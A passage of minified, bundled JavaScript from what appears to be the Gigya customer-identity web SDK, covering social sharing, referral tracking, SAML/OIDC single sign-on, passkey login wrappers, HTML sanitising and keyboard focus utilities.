        }, e.prototype.validateParams = function (e) {
          e || (e = this.getConfig().requiredParams || []), this.getConfig().defaultParams && (this.params = s.merge([this.getConfig().defaultParams, this.params]));
          var t = [];
          if (e.length > 0) for (var n in e) if (e.hasOwnProperty(n)) {
            var i = e[n];
            this.params[i] || t.push(i);
          }
          return !(t.length > 0) || (this.dispatchInvalidParamError(t[0]), !1);
        }, e.prototype.dispatchEvent = function (e, t) {
          return void 0 === t && (t = {}), t.eventName = e, this._eventDispatcher(t, this.params);
        }, e.prototype.dispatchErrorFromResponse = function (e) {
          return i.dispatchErrorFromResponse(this.params, e);
        }, e.prototype.dispatchInvalidParamError = function (e) {
          i.dispatchInvalidParamError(this.params, e);
        }, e.prototype.getEvent = function (e) {
          return this._eventWrappers[e] || (this.params[e] ? this.params[e] instanceof Array || (this.params[e] = [this.params[e]]) : this.params[e] = [], this._eventWrappers[e] = new r.EventWrapper(this.params[e])), this._eventWrappers[e];
        }, e.prototype.addGlobalEventHandlers = function (e) {
          for (var t in e) e.hasOwnProperty(t) && this.addGlobalEventHandler(t, e[t]);
        }, e.prototype.addGlobalEventHandler = function (e, t, n, i) {
          void 0 === n && (n = null), void 0 === i && (i = "socialize"), this._globalEventHandlers[e] || (this._globalEventHandlers[e] = []);
          var o = a.add(e, t, "component", n, i, this.params);
          this._globalEventHandlers[e].push(o);
        }, e.prototype.removeGlobalEventHandlers = function (e) {
          for (var t in e) e.hasOwnProperty(t) && this.removeGlobalEventHandler(t, e[t]);
        }, e.prototype.removeGlobalEventHandler = function (e, t, n, i) {
          void 0 === n && (n = null), void 0 === i && (i = "socialize");
          var r = this._globalEventHandlers[e];
          if (r) {
            var s = o.firstIndex(r, function (e) {
              return e.handler == t;
            });
            if (s > -1) {
              var c = r[s];
              a.remove(c.fullEventName, c), r.splice(s, 1);
            }
          }
        }, e.prototype.prepareCallback = function (e) {
          var t = this;
          return function () {
            for (var n = [], i = 0; i < arguments.length; i++) n[i] = arguments[i];
            if (!t._isDisposed) return e.apply(this, n);
          };
        }, e.prototype.dispose = function () {
          for (var e in this._globalEventHandlers) if (this._globalEventHandlers.hasOwnProperty(e)) for (var t in this._globalEventHandlers[e]) {
            var n = this._globalEventHandlers[e][t];
            a.remove(n.fullEventName, n);
          }
          this._globalEventHandlers = {}, this._eventWrappers = {}, this.params = {}, this._isDisposed = !0;
        }, e.instanceCounter = 0, e.NOT_IMPLEMENTED_ERROR = "Abstract method not implemented", e;
      }();
    t.BaseObject = c;
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(0),
      o = n(4),
      r = n(32),
      a = n(26),
      s = n(96),
      c = n(113),
      u = n(151),
      l = n(152),
      d = n(3),
      g = n(19),
      f = n(16),
      p = n(112),
      h = n(45),
      v = n(27),
      y = n(35),
      w = n(21),
      m = n(49),
      _ = n(9),
      b = n(12),
      S = n(24),
      P = n(245),
      A = n(2),
      I = n(97),
      k = n(246);
    function C() {
      for (var e = [], t = 0; t < arguments.length; t++) e[t] = arguments[t];
      var n = o.merge([window.gigya.thisScript.globalConf, e]),
        i = n.namespace ? n.namespace : "socialize";
      for (var a in n) 0 == a.indexOf("on") && r.add(a, n[a], n.listenerType, n.context, i, n);
      "function" == typeof n.callback && n.callback({
        status: "OK",
        statusMessage: "",
        errorCode: 0,
        errorMessage: "",
        operation: "addEventHandlers",
        context: n.context
      });
    }
    function x() {
      for (var e = [], t = 0; t < arguments.length; t++) e[t] = arguments[t];
      C(o.merge([e, {
        namespace: "accounts"
      }]));
    }
    function O() {
      var e = o.merge([window.gigya.thisScript.globalConf, arguments]);
      window.gigya.socialize.getUserInfo(e, {
        callback: function (t) {
          var n = t.user,
            i = {
              loggedIn: !!n && a.isExplicitTrue(n.isLoggedIn)
            };
          o.extractProperties(t, i, "status|statusMessage|callId|errorCode|errorMessage|errorDetails|context"), e.callback && e.callback(i);
        }
      });
    }
    function E() {
      var e = o.merge([window.gigya.thisScript.globalConf, arguments]),
        t = e.service;
      if (t) {
        t = t.toLowerCase();
        var n = e.callback;
        "fbconnect" != t && "facebook" != t || (s.isLoaded() ? n({
          context: e.context
        }) : window.gigya.socialize.addEventHandlers({
          listenerType: "component"
        }, {
          onFacebookLoaded: n,
          context: e.context
        })), "googleplus" == t && (c.isLoaded() ? n({
          context: e.context
        }) : window.gigya.socialize.addEventHandlers({
          listenerType: "component"
        }, {
          onGooglePlusLoaded: n,
          context: e.context
        }));
      }
    }
    function T() {
      for (var e = [], t = 0; t < arguments.length; t++) e[t] = arguments[t];
      return i.__awaiter(this, void 0, void 0, function () {
        var t, n, a, s, c, v, y, w, m, _, b, S, P, A;
        return i.__generator(this, function (i) {
          switch (i.label) {
            case 0:
              if ((t = o.merge([window.gigya.thisScript.globalConf, e])).APIKey || (t.APIKey = window.gigya.thisScript.APIKey), n = {}, o.extractProperties([t], n, I.postBookmarkSchema), !n.url && n.URL && (n.url = n.URL, delete n.URL), n.sdk = "js_" + window.gigya.build.version, !n.url && n.userAction && !n.userAction.linkBack) for (a = document.getElementsByTagName("meta"), s = 0; s < a.length; s++) if ("og:url" === a[s].getAttribute("property") && a[s].getAttribute("content")) {
                n.url = a[s].getAttribute("content");
                break;
              }
              return n.url || !n.userAction || n.userAction.linkBack || (n.url = document.location.href), n.provider = n.provider ? (n.provider + "").toLowerCase() : "", "facebook" === n.provider && (n.providerKey = u.getMetaTag("fb:app_id")), [4, window.gigya._.apiAdapter.getGmidTicket()];
            case 1:
              return (c = i.sent()) && (n.gmidTicket = c), v = window.gigya._.bookmarkSize[n.provider] || {}, y = {
                width: t.popupWidth || v.w,
                height: t.popupHeight || v.h,
                top: t.popupPositionY,
                left: t.popupPositionX,
                menubar: 0,
                resizable: 1,
                scrollbars: 1
              }, t.enablePopupLocation ? (y.location = 1, y.toolbar = 1) : y.toolbar = 0, (window.gigya._.apiAdapters.web ? window.gigya._.apiAdapters.web.tokenStore : void 0) && (n.login_token = window.gigya._.apiAdapters.web.tokenStore.get()), "twitter" === n.provider && d.localInfo.isIOS ? (m = n.userAction || {}, _ = {
                url: m.linkBack || n.url,
                text: m.title || n.title
              }, P = "https://twitter.com/intent/tweet?{0}", w = g.format(P, f.serialize(_)), (b = t.sourceData ? o.clone(t.sourceData) : {}).provider = n.provider, b.url = _.url, p.report("share", t.APIKey, t.cid, t.source, b, {
                tags: t.tags
              })) : (S = f.serialize(n), P = "https://" + window.gigya._.getApiDomain("socialize") + "/gs/bookmark.aspx?{0}", w = g.format(P, S)), h.logCall("postBookmark", n), r.dispatch({
                eventName: "beforeRequest",
                methodName: "socialize.postBookmark",
                rawParams: t,
                params: n
              }), A = "whatsapp" === n.provider ? "_self" : "gs_bookmark_" + n.provider, l.open(w, A, y), [2];
          }
        });
      });
    }
    function L() {
      for (var e = [], t = 0; t < arguments.length; t++) e[t] = arguments[t];
      var n = o.merge([window.gigya.thisScript.globalConf, e]),
        i = n.callback;
      window.gigya.socialize.getUserInfo(n, {
        callback: function (e) {
          var t = {
            eventName: "login",
            isInternal: !0
          };
          n.provider && (t.provider = n.provider), v.addUserInfoToEvent(e, t, !0), n.context && (t.context = n.context), r.dispatch(t), "function" == typeof i && i(e);
        }
      });
    }
    function D() {
      for (var e = [], t = 0; t < arguments.length; t++) e[t] = arguments[t];
      var n,
        i = {
          "digg.com": "digg",
          "stumbleupon.com": "stumbleupon",
          "technorati.com": "technorati",
          "t.co": "twitter",
          "plus.url.google.com": "googlePlus",
          "facebook.com": "facebook",
          "linkedin.com": "linkedIn",
          "pinterest.com": "pinterest",
          "mixi.jp": "mixi",
          "b.hatena.ne.jp": "hatena",
          "line.me": "line"
        },
        a = o.merge([window.gigya.thisScript.globalConf, e]),
        s = {
          eventName: "linkback",
          CID: a.cid
        },
        c = {},
        u = {};
      -1 != document.location.href.indexOf("#") && (u = f.deserialize(document.location.href.split("#")[1])), -1 != document.location.href.indexOf("?") && (c = f.deserialize(document.location.href.split("?")[1].split("#")[0])), window.gigya.socialize.updateRefUID(a.APIKey, u, c);
      var l = null != u._gus || null != c._gus;
      if (l && (s.CID = u._gucid || c._gucid, s.shortCode = u._gsc || c._gsc, s.provider = u._gup || c._gup), !n) {
        var d,
          g = {
            url: document.location.href,
            ref: document.referrer
          };
        if (c.fb_ref) {
          var h = f.deserialize(c.fb_ref, ":");
          g.uuid = h.uu, g.sn = h.p, d = h.s;
        } else if (document.referrer && -1 != document.referrer.indexOf("://")) {
          var v = document.referrer.split("://")[1].split("/")[0];
          0 == v.indexOf("www.") && (v = v.split("www.")[1]), i[v] && (s.provider = g.sn = i[v]);
        }
        if (!g.sn && (!document.referrer || -1 == document.referrer.indexOf("http://soc.li") && -1 == document.referrer.indexOf("https://shr.gs"))) {
          var y = document.location.href.split("#guid=");
          if (y.length > 1) {
            var w = y[1].split("#")[0].split("&")[0];
            w != window.gigya._.apiAdapter.getTokenParam(a.APIKey, "UUID") && (g.sn = "AddressBarShares", g.uuid = w, "_" == w && delete g.uuid, document.location.replace("#"), p.trackAddressBarShares(), g.url = document.location.href.split("#")[0]);
          }
        }
        g.uuid && M(a.APIKey, g.uuid), g.sn && !l && p.report("linkback", a.APIKey, a.cid, d, null, g), (g.sn || l) && r.dispatch(o.removeUndefined(s)), n = !0;
      }
      "function" == typeof a.callback && a.callback({
        status: "OK",
        statusMessage: "",
        operation: "trackReferrals",
        context: a.context,
        errorMessage: "",
        errorCode: 0
      });
    }
    function j(e, t, n) {
      e || (e = window.gigya.thisScript.globalConf.APIKey), t || (t = {}, -1 != document.location.href.indexOf("#") && (t = f.deserialize(document.location.href.split("#")[1]))), n || (n = {}, -1 != document.location.href.indexOf("?") && (n = f.deserialize(document.location.href.split("?")[1].split("#")[0]))), t.guid && "_" != t.guid && M(e, t.guid);
      var i = t._giguuid || n._giguuid;
      i && M(e, i);
    }
    function M(e, t) {
      A.FlagService.setCookieSameSiteLaxLowPriority ? b.default.set(this.getGigRefUidCookieKey(e), t, null, null, null, "Lax") : b.default.set(this.getGigRefUidCookieKey(e), t);
    }
    function R() {
      for (var e = [], t = 0; t < arguments.length; t++) e[t] = arguments[t];
      var n = o.merge([window.gigya.thisScript.globalConf, e]);
      if ("function" == typeof n.callback) {
        var i = {
          status: "OK",
          statusMessage: "",
          operation: "hideUI",
          context: n.context,
          errorMessage: "",
          errorCode: 0
        };
        n.callback(i);
      }
    }
    function U() {
      for (var e = [], t = 0; t < arguments.length; t++) e[t] = arguments[t];
      var n = {},
        i = o.merge([window.gigya.thisScript.globalConf, e]),
        r = document.getElementById(i.form);
      if (!r) {
        var a = document.getElementsByName(i.form);
        a && a.length > 0 && (i.form = a[0]);
      }
      for (var s = 0; s < r.elements.length; s++) {
        var c = r.elements[s];
        if (c.name) {
          for (var u = c.name.split("."), l = n, d = 0; d < u.length - 1; d++) {
            var g = u[d];
            l[g] || (l[g] = {}), l = l[g];
          }
          l[u[u.length - 1]] = c.value;
        }
      }
      i.data = n, window.gigya.gcs.setUserData(i);
    }
    function N() {
      for (var e = [], t = 0; t < arguments.length; t++) e[t] = arguments[t];
      var n = o.merge([window.gigya.thisScript.globalConf, e]);
      y.load(w.getCdnResource("/js/gigya.services.socialize.plugins.shareCounts.min.js"), null, function () {
        window.gigya.socialize.plugins.shareCounts.getProviderShareCounts(n);
      }, !0);
    }
    function z(e) {
      e || (e = {});
      var t = window.open("", "_blank");
      e.callback = function (n) {
        0 !== n.errorCode ? (t.close(), "function" == typeof e.onError && e.onError(n)) : n.targetUrl && n.id_token ? m.redirect(n.targetUrl, [{
          id_token: n.id_token
        }], n.method ? n.method : "POST", void 0, t.document) : (t.close(), window.gigya.logger.error("accounts.b2b.delegatedAdminLogin - missing required params", {
          targetURL: n.targetUrl,
          id_token: n.id_token
        }));
      }, window.gigya.accounts.b2b.delegatedAdminLogin(e);
    }
    t.bookmarkSize = {
      facebook: {
        w: 640,
        h: 370
      },
      twitter: {
        w: 880,
        h: 585
      },
      messenger: {
        w: 710,
        h: 905
      },
      linkedin: {
        w: 560,
        h: 500
      },
      yahoobookmarks: {
        w: 840,
        h: 975
      },
      digg: {
        w: 1010,
        h: 1045
      },
      googlebookmarks: {
        w: 710,
        h: 905
      },
      mixi: {
        w: 640,
        h: 470
      },
      googleplus: {
        w: 496,
        h: 420
      }
    }, t.socializeAddEventHandlers = C, t.accountsAddEventHandlers = x, t.isLoggedIn = O, t.waitForService = E, t.postBookmark = T, t.refreshUI = L, t.trackReferrals = D, t.updateRefUID = j, t.setGigRefUidCookie = M, t.hideUI = R, t.submitUserForm = U, t.getProviderShareCounts = N, t.openDelegateAdminHandler = z, window.gigya.socialize.updateRefUID = j, window.gigya.socialize.hideUI = R, window.gigya.gcs.submitUserForm = U, window.gigya.socialize.getProviderShareCounts = N, window.gigya.socialize.addEventHandlers = C, window.gigya.accounts.addEventHandlers = x, window.gigya.socialize.isLoggedIn = O, window.gigya.socialize.waitForService = E, window.gigya.socialize.postBookmark = T, window.gigya.socialize.refreshUI = L, window.gigya.socialize.trackReferrals = D, _.createAlias("gigya.accounts.b2b.openDelegatedAdminLogin", z), _.createAlias("gigya.accounts.setSSOToken", window.gigya.setSSOToken), _.createAlias("gigya.getLoginToken", S.get), _.createAlias("gigya.accounts.auth.fido.register", k.registerPasskey), _.createAlias("gigya.accounts.auth.fido.login", k.passkeyLogin), _.createAlias("gigya.accounts.auth.getPreferredLoginMethod", P.getPreferredLoginMethod), _.createAlias("gigya.accounts.auth.setPreferredLoginMethod", P.setPreferredLoginMethod);
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(50);
    t.getPreferredLoginMethod = function (e) {
      return i.siteData.getPreferredLoginMethod(e);
    }, t.setPreferredLoginMethod = function (e, t) {
      i.siteData.setPreferredLoginMethod(e, t);
    };
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(52),
      o = function (e, t) {
        return "function" == typeof (null == e ? void 0 : e.callback) && e.callback(t), t;
      };
    t.registerPasskey = function (e) {
      return void 0 === e && (e = {}), i.default.registerPasskey(e, !0).then(function (t) {
        return o(e, t);
      }).catch(function (t) {
        throw o(e, t);
      });
    }, t.passkeyLogin = function (e) {
      return void 0 === e && (e = {}), i.default.authenticate(e).then(function (t) {
        return o(e, t);
      }).catch(function (t) {
        throw o(e, t);
      });
    };
  }, function (e, t) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(0),
      o = n(10),
      r = n(4),
      a = n(49),
      s = n(61);
    function c() {
      var e = window.gigya.samlConfig && window.gigya.samlConfig.proxyPageURL;
      return e || window.gigya.logger.warn("missing proxy page url"), e;
    }
    function u(e, t) {
      return void 0 === t && (t = {}), i.__awaiter(this, void 0, void 0, function () {
        var n, o, r;
        return i.__generator(this, function (i) {
          switch (i.label) {
            case 0:
              return n = window.gigya._.getApiDomain("fidm"), o = "https://" + n + "/saml/v2.0/" + window.gigya.apiKey + "/" + e, [4, window.gigya._.apiAdapter.getGmidTicket()];
            case 1:
              return (r = i.sent()) && (t.gmidTicket = r), a.redirect(o, [t]), [2];
          }
        });
      });
    }
    t.initSSO = function (e, t) {
      void 0 === t && (t = !0);
      var n = s.getLoginTokenExpiration(window.gigya.apiKey);
      if (!t) {
        var a = window.gigya.getLoginToken();
        return u("idp/sso/init", i.__assign({
          loginToken: a,
          loginTokenExp: n
        }, e));
      }
      var l = c();
      window.location.href = o.addParamsToURL(l, r.merge([{
        mode: "initSSO"
      }, i.__assign({
        loginTokenExp: n
      }, e)]));
    }, t.continueSSO = function (e, t) {
      void 0 === e && (e = {}), void 0 === t && (t = !0);
      var n = o.getParamsFromURL(location.href).samlContext,
        r = s.getLoginTokenExpiration(window.gigya.apiKey);
      if (!t) {
        var a = window.gigya.getLoginToken();
        return u("idp/sso/continue", i.__assign({
          loginToken: a,
          samlContext: n,
          loginTokenExp: r
        }, e));
      }
      var l = c();
      window.location.href = o.addParamsToURL(l, {
        mode: "afterLogin",
        samlContext: n,
        loginTokenExp: r
      });
    }, t.cancelSSO = function (e, t) {
      void 0 === t && (t = !0);
      var n = o.getParamsFromURL(location.href).samlContext;
      if (!t) return u("idp/sso/cancel", i.__assign(i.__assign({
        samlContext: n
      }, e), {
        cancelCode: encodeURIComponent(e.cancelCode),
        statusCode: encodeURIComponent(e.statusCode)
      }));
      var r = c();
      window.location.href = o.addParamsToURL(r, {
        mode: "cancel",
        samlContext: n,
        cancelCode: null == e ? void 0 : e.cancelCode,
        statusCode: null == e ? void 0 : e.statusCode
      });
    }, t.logoutSSO = function (e, t) {
      void 0 === t && (t = !0);
      var n = o.getParamsFromURL(location.href).samlContext;
      window.gigya.socialize.logout({
        callback: function (r) {
          if (0 === r.errorCode && !t) return u("idp/slo/finalize", i.__assign({
            samlContext: n
          }, e));
          var a = c();
          window.location.href = o.addParamsToURL(a, {
            mode: "logout",
            samlContext: n
          });
        },
        samlContext: n
      });
    };
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(0),
      o = n(153),
      r = n(12),
      a = n(2),
      s = function () {
        function e() {}
        return e.prototype.verifyLogin = function () {
          return i.__awaiter(this, void 0, void 0, function () {
            var e, t;
            return i.__generator(this, function (n) {
              return e = Number(window.gigya.thisScript.globalConf.verifyLoginInterval), isNaN(e) ? [2, !0] : (e <= 0 && (e = 1), t = 3600 * Math.ceil(e) * 1e3, o.now() < this.lastVerification + t ? [2, !0] : (this.lastVerification = o.now(), [2, new gigya.Promise(function (e) {
                window.gigya.accounts.verifyLogin({
                  ignoreApiQueue: !0,
                  callback: function (t) {
                    e(0 === t.errorCode);
                  }
                });
              })]));
            });
          });
        }, Object.defineProperty(e.prototype, "lastVerification", {
          get: function () {
            return Number(r.default.get(this.lastVerificationCookieKey));
          },
          set: function (e) {
            a.FlagService.setCookieSameSiteLaxSession ? r.default.set(this.lastVerificationCookieKey, String(e), null, null, null, "Lax") : r.default.set(this.lastVerificationCookieKey, String(e));
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e.prototype, "lastVerificationCookieKey", {
          get: function () {
            return "gig_last_ver_" + window.gigya.thisScript.APIKey;
          },
          enumerable: !0,
          configurable: !0
        }), e;
      }();
    t.AccountService = s, t.accountService = new s();
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(0),
      o = n(6),
      r = n(49),
      a = function () {
        function e() {}
        return e.prototype.getContext = function (t) {
          var n = t.opKey,
            r = i.__rest(t, ["opKey"]);
          return i.__awaiter(this, void 0, void 0, function () {
            return i.__generator(this, function (t) {
              return [2, o.Uri.parse(e.baseUrl(n) + "/sso/getContext").addToSearch(r).fetch()];
            });
          });
        }, e.prototype.redirectToContinue = function (t) {
          var n = t.opKey,
            o = i.__rest(t, ["opKey"]);
          r.redirect(e.baseUrl(n) + "/authorize/continue", [o], "GET");
        }, e.baseUrl = function (e) {
          var t;
          return "https://" + (null !== (t = window.gigya._.getApiDomain) && void 0 !== t ? t : window.gigya._.apiDomainFactory())("fidm") + "/oidc/op/v1.0/" + e;
        }, e;
      }();
    t.op = new a();
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(17),
      o = n(154),
      r = function () {
        function e(e) {
          this.workflowDefinitionId = e, this.eventMap = new Map();
        }
        return e.prototype.on = function (e, t) {
          return this.eventMap.set(e, t), this;
        }, e.prototype.error = function (e) {
          return this.errorHandler = e, this;
        }, e.prototype.execute = function () {
          var e = this;
          i.queueForExecution("API", function () {
            new o.InitActivity(e, null).run();
          });
        }, e;
      }();
    t.Flow = r, t.flow = function (e) {
      return new r(e);
    };
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(0),
      o = n(117),
      r = n(155),
      a = n(118),
      s = function (e) {
        function t() {
          return null !== e && e.apply(this, arguments) || this;
        }
        return i.__extends(t, e), t.prototype.run = function () {
          return i.__awaiter(this, void 0, void 0, function () {
            var e, t;
            return i.__generator(this, function (n) {
              switch (n.label) {
                case 0:
                  if (!(e = this.flow.eventMap.get(this.params.eventName))) return [3, 4];
                  n.label = 1;
                case 1:
                  return n.trys.push([1, 3,, 4]), [4, e({
                    eventName: this.params.eventName,
                    workflowDefinitionId: this.flow.workflowDefinitionId
                  })];
                case 2:
                  return n.sent(), this.params.afterEventUrl && this.next(this.params.afterEventUrl), [3, 4];
                case 3:
                  return t = n.sent(), this.flow.errorHandler(t), [3, 4];
                case 4:
                  return [2];
              }
            });
          });
        }, t;
      }(o.BaseActivity);
    t.EventActivity = s, a.ActivityLibrary.registerActivity(r.ActivityType.Event, s);
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(0),
      o = n(117),
      r = n(155),
      a = n(118),
      s = function (e) {
        function t() {
          return null !== e && e.apply(this, arguments) || this;
        }
        return i.__extends(t, e), t.prototype.run = function () {
          return i.__awaiter(this, void 0, void 0, function () {
            var e = this;
            return i.__generator(this, function (t) {
              return this.params.screenSet && this.params.startScreen ? (window.gigya.accounts.showScreenSet({
                screenSet: this.params.screenSet,
                startScreen: this.params.startScreen,
                onAfterSubmit: function (t) {
                  var n;
                  0 === (null === (n = t.response) || void 0 === n ? void 0 : n.errorCode) ? e.params.onSubmitUrl && e.next(e.params.onSubmitUrl) : e.flow.errorHandler(t.response);
                }
              }), [2]) : [2];
            });
          });
        }, t;
      }(o.BaseActivity);
    t.ScreenSetActivity = s, a.ActivityLibrary.registerActivity(r.ActivityType.ScreenSet, s);
  }, function (e, t, n) {
    (function (e) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var i = n(12),
        o = n(18),
        r = n(255),
        a = n(153),
        s = n(256),
        c = n(13),
        u = n(22),
        l = n(9),
        d = n(62),
        g = n(41),
        f = n(49),
        p = n(5),
        h = n(257),
        v = n(16),
        y = n(14),
        w = n(258),
        m = n(4),
        _ = n(17),
        b = n(259),
        S = n(35),
        P = n(43),
        A = n(119),
        I = n(36),
        k = n(19),
        C = n(260),
        x = n(93),
        O = n(6),
        E = n(10),
        T = n(26),
        L = n(39),
        D = n(152),
        j = n(261),
        M = n(30),
        R = n(9),
        U = n(36),
        N = n(156);
      window.gigya._ || (window.gigya._ = {}), window.gigya.utils || (window.gigya.utils = {}), window.gigya.utils.toggles || (window.gigya.utils.toggles = M.default), window.gigya.utils.array || (window.gigya.utils.array = {}), window.gigya.utils.browser || (window.gigya.utils.browser = {}), window.gigya.utils.cookie || (window.gigya.utils.cookie = i.default), window.gigya.utils.date || (window.gigya.utils.date = {}), window.gigya.utils.delegate || (window.gigya.utils.delegate = {}), window.gigya.utils.DOM || (window.gigya.utils.DOM = {}), window.gigya.utils.functions || (window.gigya.utils.functions = {}), window.gigya.utils.gltexp || (window.gigya.utils.gltexp = {}), window.gigya.utils.HTTP || (window.gigya.utils.HTTP = {}), window.gigya.utils.JSON || (window.gigya.utils.JSON = {}), window.gigya.utils.keyboard || (window.gigya.utils.keyboard = {}), window.gigya.utils.keyValue || (window.gigya.utils.keyValue = {}), window.gigya.utils.localStorage || (window.gigya.utils.localStorage = {}), window.gigya.utils.mouse || (window.gigya.utils.mouse = {}), window.gigya.utils.object || (window.gigya.utils.object = {}), window.gigya.utils.queue || (window.gigya.utils.queue = {}), window.gigya.utils.sanitize || (window.gigya.utils.sanitize = {}), window.gigya.utils.script || (window.gigya.utils.script = {}), window.gigya.utils.sessionCache || (window.gigya.utils.sessionCache = {}), window.gigya.utils.localCache || (window.gigya.utils.localCache = {}), window.gigya.utils.stringUtils || (window.gigya.utils.stringUtils = {}), window.gigya.utils.templates || (window.gigya.utils.templates = {}), window.gigya.utils.URL || (window.gigya.utils.URL = {}), window.gigya.utils.validation || (window.gigya.utils.validation = {}), window.gigya.utils.viewport || (window.gigya.utils.viewport = {}), window.gigya.utils.win || (window.gigya.utils.win = {}), window.gigya.utils.xd || (window.gigya.utils.xd = {}), window.gigya.utils.recaptcha || (window.gigya.utils.recaptcha = N.default), e(window.gigya._, O, u), e(window.gigya.utils.array, o), e(window.gigya.utils.browser, r), e(window.gigya.utils.date, a), e(window.gigya.utils.delegate, s), e(window.gigya.utils.DOM, c), e(window.gigya.utils.functions, l), e(window.gigya.utils, d, I, C), e(window.gigya.utils.gltexp, g), e(window.gigya.utils.HTTP, f), e(window.gigya.utils.JSON, p), e(window.gigya.utils.keyboard, h), e(window.gigya.utils.keyValue, v), e(window.gigya.utils.localStorage, y), e(window.gigya.utils.mouse, w), e(window.gigya.utils.object, m), e(window.gigya.utils.queue, _), e(window.gigya.utils.sanitize, b), e(window.gigya.utils.script, S), e(window.gigya.utils.sessionCache, P), e(window.gigya.utils.localCache, A), e(window.gigya.utils.stringUtils, k), e(window.gigya.utils.templates, x), e(window.gigya.utils.URL, E), e(window.gigya.utils.validation, T), e(window.gigya.utils.viewport, L), e(window.gigya.utils.win, D), e(window.gigya.utils.xd, j), R.createAlias("gigya.getUrlParam", function (e) {
        return U.getReqParamValue(location.search, e);
      });
    }).call(this, n(0).__assign);
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(3),
      o = navigator.userAgent.toLowerCase(),
      r = {
        version: null
      };
    function a() {
      if (r.version) return r.version;
      try {
        var e = o.match(/(opera|chrome|safari|firefox|msie|trident.*rv:)\/?\s*(\.?\d+(\.\d+)*)/i);
        if (e[2]) {
          var t = e[2].split(".")[0];
          if (!isNaN(parseInt(t))) return r.version = parseInt(t);
        }
      } catch (e) {}
      return 0;
    }
    t.isModern = function () {
      return i.localInfo.isChrome || i.localInfo.isFF || i.localInfo.isEdge || i.localInfo.isOpera || i.localInfo.isIOSWebView || i.localInfo.isIE && a() >= 9 || i.localInfo.isEdgeLegacy || i.localInfo.isSafari && a() >= 4 || i.localInfo.isGoogleBot;
    }, t.getVersion = a;
  }, function (e, t) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    }), t.create = function (e, t) {
      return function () {
        for (var n = [], i = 0; i < arguments.length; i++) n[i] = arguments[i];
        return t.apply(e, n);
      };
    };
  }, function (e, t, n) {
    var i;
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var o = n(13);
    t.keyCodes = ((i = {})[27] = "Escape", i[8] = "Backspace", i[13] = "Enter", i), t.onHotKeyClicked = function (e, t) {
      return new r(e, t);
    };
    var r = function () {
      function e(e, n) {
        this.el = e.elementContext ? e.elementContext : document.body, this.eventHandler = function (i) {
          i.which !== e.key && i.key !== t.keyCodes[e.key] || n();
        }, o.addEventListener(this.el, "keyup", this.eventHandler);
      }
      return e.prototype.unsubscribe = function () {
        o.removeEventListener(this.el, "keyup", this.eventHandler);
      }, e;
    }();
  }, function (e, t) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    t.getPosition = function () {
      var e = 0,
        t = 0;
      if (document.body) {
        var n = null;
        return n || (n = {
          clientX: 0,
          clientY: 0
        }), n.pageX || n.pageY ? (e = n.pageX, t = n.pageY) : (n.clientX || n.clientY) && (e = n.clientX + document.body.scrollLeft + document.documentElement.scrollLeft, t = n.clientY + document.body.scrollTop + document.documentElement.scrollTop), {
          x: e,
          y: t
        };
      }
    };
  }, function (e, t) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    }), t.sanitizeHTML = function (e) {
      return null == e || void 0 === e ? e : e.replace(/&/g, "&#38;").replace(/</g, "&#60;").replace(/>/g, "&#62;").replace(/\"/g, "&#34;").replace(/'/g, "&#39;").replace(/&#38;#173;/g, "&#173;");
    }, t.sanitizeAttribute = function (e) {
      return null == e || void 0 === e ? e : e.replace(/&/g, "&#38;").replace(/</g, "&#60;").replace(/>/g, "&#62;").replace(/\"/g, "&#34;").replace(/\=/g, "&#61;");
    };
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(13),
      o = function () {
        function e() {
          this.bindings = [];
        }
        return e.getInstance = function () {
          return e.self || (e.self = new e()), e.self;
        }, e.prototype.bindTabLooping = function (e, t) {
          if (!this.getListenerByContainer(e)) {
            var n = this.createListener(e, t);
            window.addEventListener("keydown", n, !0);
          }
        }, e.prototype.unbindTabLooping = function (e) {
          var t = this.getListenerByContainer(e);
          t && window.removeEventListener("keydown", t, !0);
        }, e.prototype.getSortedTabbableElements = function (t, n) {
          for (var i = this, o = 0, r = t.querySelectorAll(e.selector), a = [], s = 0; s < r.length; ++s) {
            var c = r[s];
            this.isTabbable(c, n) && (c.setAttribute(e.naturalTabOrder, String(o)), o++, a.push(c));
          }
          return a.sort(function (e, t) {
            return i.sort(e, t);
          }), a;
        }, e.prototype.createListener = function (e, t) {
          var n = this,
            o = function (o) {
              var r = document.activeElement;
              if (9 === o.keyCode && e.contains(r)) {
                var a = o.shiftKey ? n.getPreviousTabbableElement(e, r, t) : n.getNextTabbableElement(e, r, t);
                a && (a.focus(), i.cancelEvent(o));
              }
            };
          return this.bindings.push({
            container: e,
            listener: o
          }), o;
        }, e.prototype.isTabbable = function (e, t) {
          var n = e.matches || e.msMatchesSelector;
          return -1 !== e.tabIndex && (e.offsetWidth > 0 || e.offsetHeight > 0) && (!t || n.call(e, t));
        }, e.prototype.getNextTabbableElement = function (e, t, n) {
          var i = this.getSortedTabbableElements(e, n),
            o = i.indexOf(t);
          return -1 === o ? void 0 : o !== i.length - 1 ? i[o + 1] : i[0];
        }, e.prototype.getPreviousTabbableElement = function (e, t, n) {
          var i = this.getSortedTabbableElements(e, n),
            o = i.indexOf(t);
          return -1 === o ? void 0 : 0 !== o ? i[o - 1] : i[i.length - 1];
        }, e.prototype.sort = function (t, n) {
